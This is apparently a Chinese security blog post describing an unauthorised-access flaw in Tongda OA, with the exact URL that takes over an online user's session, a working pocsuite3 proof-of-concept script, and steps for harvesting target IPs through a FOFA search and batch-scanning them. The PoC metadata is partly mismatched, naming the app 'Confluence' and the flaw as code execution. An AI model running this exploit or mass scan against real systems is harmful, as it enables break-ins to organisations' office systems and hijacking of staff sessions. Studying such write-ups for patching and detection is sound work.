### 漏洞类型：未授权访问

### 漏洞利用条件：用户在线

### 漏洞详情

1、先访问  
http://xxx.xxx.xxx/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0

如果出现空白页面,则说明已经获得权限.  
![image](https://image.3001.net/images/20210310/1615369254_60489426290f3e3e70dde.png!small)  
2、再访问http://xxx.xxx.xxx/general/ ,成功进入系统  
![image](https://image.3001.net/images/20210310/1615369289_604894498f6c4ab844169.png!small)  
3、如果出现RELOGIN,则说明目前没有人在线,需要等待有人登录的时候在尝试  
![image](https://image.3001.net/images/20210310/1615369373_6048949d1feba6f544594.png!small)

### pocsuite3编写poc

github下载地址：https://github.com/knownsec/Pocsuite3  
使用pocsuite3编写poc,代码如下

    
    
    import re
    
    from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
    
    
    class DemoPOC(POCBase):
        vulID = ''  # ssvid
        version = '1.0'
        author = ['w7ay']
        vulDate = '2021-3-8'
        createDate = '2021-3-8'
        updateDate = '2021-3-8'
        references = ['https://mp.weixin.qq.com/s/IabOKaeNyAsh8V4k2cmXAw']
        name = '通达OA未授权访问漏洞'
        appPowerLink = ''
        appName = 'Confluence'
        appVersion = ''
        vulType = VUL_TYPE.CODE_EXECUTION
        desc = '''查看是否存在通达OA未授权访问漏洞'''
        samples = []
        install_requires = ['']
        category = POC_CATEGORY.EXPLOITS.WEBAPP
    
        def _verify(self):
            result = {}
            payload = "/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0"
            response = requests.get(self.url + payload)
            if "RELOGIN" not in response.text and response.status_code == 200:
                result['status'] = '[+] 存在通达OA未授权访问漏洞'
            return self.parse_output(result)
    
        def _attack(self):
            return self._verify()
    
        def parse_output(self, result):
            output = Output(self)
            if result:
                output.success(result)
            else:
                output.fail('target is not vulnerable')
            return output
    
    register_poc(DemoPOC)
    

主要在于_verify()这个函数中验证是否存在漏洞，判断如果返回的内容不存在RELOGIN，并且状态码为200，说明可能存在漏洞。  
将写好的脚本保存放在pocs目录下，文件名为oa.py。  
利用fofa收集ip，搜索语法：body="通达oa"  
将收集的ip保存放在pocsuite3目录下，文件名为通达OA.txt  
![image.png](https://image.3001.net/images/20210310/1615370390_60489896d13da7cb12611.png!small)  
运行脚本：python3 cli.py -r pocs/oa.py -f 通达OA.txt --plugins html_report  
-r 表示指定使用的脚本文件  
-f 表示目标文件  
\--plugins html_report 表示将结果保存为html文件  
结果输出保存在HTML文件中，打开文件  
![image.png](https://image.3001.net/images/20210310/1615370629_60489985ac83256082e74.png!small)  
验证结果如下：  
![image.png](https://image.3001.net/images/20210310/1615370687_604899bf802565fdb70a3.png!small)

参考链接：<https://mp.weixin.qq.com/s/IabOKaeNyAsh8V4k2cmXAw>

